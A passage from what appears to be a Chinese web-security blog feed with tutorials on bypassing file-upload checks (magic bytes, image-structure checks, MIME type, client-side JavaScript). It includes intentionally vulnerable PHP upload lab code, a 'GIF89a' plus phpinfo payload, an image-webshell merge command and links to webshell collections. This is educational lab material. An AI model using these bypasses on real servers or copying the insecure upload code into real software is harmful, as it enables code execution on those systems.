alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（三）：服务端检测绕过】3.4服务端文件内容检测绕过</title>
      <link href="2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/"/>
      <url>2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>简单文件头检测、文件幻数检测</li><li>完整文件结构检测</li></ul><a id="more"></a><h3 id="0x01-简单文件头检测"><a href="#0x01-简单文件头检测" class="headerlink" title="0x01 简单文件头检测"></a>0x01 简单文件头检测</h3><ul><li><p>文件幻数检测</p><p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46</p><p>  GIF ： 47 49 46 38 39 61 (GIF89a)</p><p>  PNG： 89 50 4E 47</p></li><li><p>如下图所示代码，是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法。</p></li></ul><h4 id="简单文件头检测测试示例"><a href="#简单文件头检测测试示例" class="headerlink" title="简单文件头检测测试示例"></a>简单文件头检测测试示例</h4><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = <span class="string">"uploads/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>如果仅在含phpinfo()的文件（phpinfo.php）将其修改为phpinfo.gif是不行的，需在文件内容开头添加gif的文件幻数GIF8a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试：利用burpsuite截包，repeater重放功能<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload01.png" alt=""></p></li><li><p>利用：利用本地文件包含，访问已上传的图片文件（因为图片无法直接被解析）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload02.png" alt=""></p></li></ul><h3 id="0x02-完整文件结构检测"><a href="#0x02-完整文件结构检测" class="headerlink" title="0x02 完整文件结构检测"></a>0x02 完整文件结构检测</h3><ul><li>通过调用图像函数（如：getimagesize/imagecreatefromgif/imagecreatefrompng）,进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上追加头部起始字节的方法进行绕过。</li><li>但是对于getimagesize，如果在文件头追加GIF89a，也是可以成功上传的，但是imagecreatefromgif等无法绕过</li></ul><h4 id="2-1-绕过方法"><a href="#2-1-绕过方法" class="headerlink" title="2.1 绕过方法"></a>2.1 绕过方法</h4><ul><li>将图片文件与欲上传的文件进行合并绕过检测</li><li>copy命令进行文件合并</li><li>合并后的文件只要未经过清洗或缩放等操作即可通过检测，并保存欲上传文件的完整性</li><li>上传文件的图片部分在解析为PHP时会以乱码显示，建议与尽量小的文件进行合并，否则会有大量乱码</li></ul><h4 id="2-2图片一句话木马制作"><a href="#2-2图片一句话木马制作" class="headerlink" title="2.2图片一句话木马制作"></a>2.2图片一句话木马制作</h4><ul><li>创建一个文件夹，包含a.bat,tp.gif,yjh.php</li><li>a.bat内容为cmd；yjh.php内容为<code>&lt;?php phpinfo(): ?&gt;</code></li><li>点击bat文件进入DOS命令，写入”copy  tp.gif/b+yjh.php  tpyjh.gif” 回车<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload03.png" alt=""></li></ul><h4 id="2-3实战示例"><a href="#2-3实战示例" class="headerlink" title="2.3实战示例"></a>2.3实战示例</h4><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = isImage($temp_file);</span><br><span class="line"><span class="keyword">if</span>(@imagecreatefromgif($temp_file))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">$msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img_path = <span class="string">"uploads/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).$file_type;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">$is_upload = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$msg=<span class="string">"文件不是gif图片"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>利用burpsuite重放，获取生成的随机图片文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload04.png" alt=""></p></li><li><p>利用本地文件包含访问图片<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload05.png" alt=""></p></li></ul><h3 id="0x03-恶意文件内容检测"><a href="#0x03-恶意文件内容检测" class="headerlink" title="0x03 恶意文件内容检测"></a>0x03 恶意文件内容检测</h3><ul><li>检测提交内容中是否包含Webshell等数据</li><li>推荐使用强混淆的weevely进行尝试，kail中自带<br><a href="https://github.com/sunge/Weevely" target="_blank" rel="noopener">https://github.com/sunge/Weevely</a></li><li>或者尝试开源的webshell收集项目<br><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（三）：服务端检测绕过】3.1服务端MIME类型检测绕过</title>
      <link href="2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>2020/03/27/3.1%20%E6%9C%8D%E5%8A%A1%E7%AB%AFMIME%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="本文内容"><a href="#本文内容" class="headerlink" title="本文内容"></a>本文内容</h3><ul><li>文件头content-type字段校验（image/gif等）绕过</li></ul><a id="more"></a><h3 id="0x01-服务端一般检测的内容"><a href="#0x01-服务端一般检测的内容" class="headerlink" title="0x01 服务端一般检测的内容"></a>0x01 服务端一般检测的内容</h3><ul><li>上传的文件名（扩展名、黑白名单）</li><li>MIME/TYPE （浏览器根据文件扩展名自动生成）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload01.png" alt="部分burpsuite截取的部分展示"></li></ul><h3 id="0x02-MIME了解"><a href="#0x02-MIME了解" class="headerlink" title="0x02 MIME了解"></a>0x02 MIME了解</h3><ul><li><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p></li><li><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p></li><li><p>浏览器会自动根据所上传的文件的扩展名，对应到相应的MIME类型上</p></li><li><p>常见的白名单MIME/TYPE<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload02.png" alt=""></p></li></ul><h3 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h3><ul><li>环境：windows+phpstudy+burpsuite</li><li>由于本地127.0.0.1burpsuite截不到包故采用本地网络地址</li></ul><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = <span class="string">'uploads/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">$msg= <span class="string">"&lt;br/&gt;成功上传至:&lt;b&gt; "</span>.$img_path.<span class="string">"&lt;/b&gt;"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line"></span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span> onsubmit=<span class="string">"return checkFile()"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>尝试上传一个含phpinfo的文件（phpinfo.php）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload04.png" alt=""></p></li><li><p>使用burpsuite截断修改content-type，重新提交报文<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload05.png" alt=""></p></li><li><p>将burpsuite截断关闭，访问上传的文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20331upload06.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（二）：前端检测绕过】2.2提交报文修改检测</title>
      <link href="2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/"/>
      <url>2020/03/26/2.2%20%E6%8F%90%E4%BA%A4%E6%8A%A5%E6%96%87%E4%BF%AE%E6%94%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>提交报文修改检测</li><li>绕过示例</li></ul><a id="more"></a><h3 id="0x01-提交报文修改检测（前端检测通用）"><a href="#0x01-提交报文修改检测（前端检测通用）" class="headerlink" title="0x01 提交报文修改检测（前端检测通用）"></a>0x01 提交报文修改检测（前端检测通用）</h3><ul><li><p>首先选择正常的文件进行上传</p></li><li><p>而后通过BurpSuite进行截包改包或改包重放完成文件上传</p><p>  这种方法前端绕过检测中通用，无需理会具体前端的检测代码，直接绕过前端进行上传报文的修改并提交</p></li></ul><h3 id="0x02-示例"><a href="#0x02-示例" class="headerlink" title="0x02 示例"></a>0x02 示例</h3><p>（1）环境<br>   <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass01.png" alt=""></p><p>（2）选择本地一张含phpinfo()函数的图片（phpinfo.jpg）,使用burpsuite截包<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass06.png" alt=""></p><p>（3）burpsuite进行重放<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass07.png" alt=""></p><ul><li><p>原始<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass08.png" alt=""></p></li><li><p>修改后：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass09.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（二）：前端检测绕过】2.1客户端检测绕过</title>
      <link href="2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>2020/03/26/2.1%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>主要客户端检测绕过类型</li><li>前端js检测绕过示例</li></ul><a id="more"></a><h3 id="0x01-客户端检测绕过"><a href="#0x01-客户端检测绕过" class="headerlink" title="0x01 客户端检测绕过"></a>0x01 客户端检测绕过</h3><p>（1）JavaScript检测：通过浏览器提交上传请求前，触发检测用JS脚本进行检测。</p><pre><code>例如：普通的表单上传</code></pre><p>（2）Flash AS脚本检测：上传用Flash，提交上传请求前，触发检测用AS脚本进行检测。</p><pre><code>例如:DZ的头像上传</code></pre><p>（3）APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中</p><ul><li>客户端检测一般只检测文件扩展名<blockquote><p>客户端进行的检测，可通过对客户端代码的一些修改或直接拦截修改报文即可绕过，所以这种上传限制约等于没有</p></blockquote></li></ul><h3 id="0x02-前端JavaScript检测绕过"><a href="#0x02-前端JavaScript检测绕过" class="headerlink" title="0x02 前端JavaScript检测绕过"></a>0x02 前端JavaScript检测绕过</h3><ul><li>查看onchange、onsubmit等事件<ul><li>onchange事件会在域的内容改变时发生</li><li>onsubmit事件会在表单中的确认按钮被点击时发生</li></ul></li><li>删除掉相关事件中的检测函数</li></ul><h3 id="0x03-测试案例"><a href="#0x03-测试案例" class="headerlink" title="0x03 测试案例"></a>0x03 测试案例</h3><p>（1）环境</p><pre><code>windows+phpstudy+uploadlab</code></pre><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass01.png" alt=""></p><p>（2）尝试上传含phpinfo()函数的php文件（phpinfo.php）</p><p>   <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass02.png" alt=""></p><p>（3）F12审查元素代码，找到事件触发函数<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass03.png" alt=""></p><p>（4）删除onsubmit，重新提交，并访问上传的文件<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass04.png" alt=""></p><p>（5）查看网页源代码可找到上传文件路径相关信息<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20330pass05.png" alt=""></p><p>（6）js校验代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span 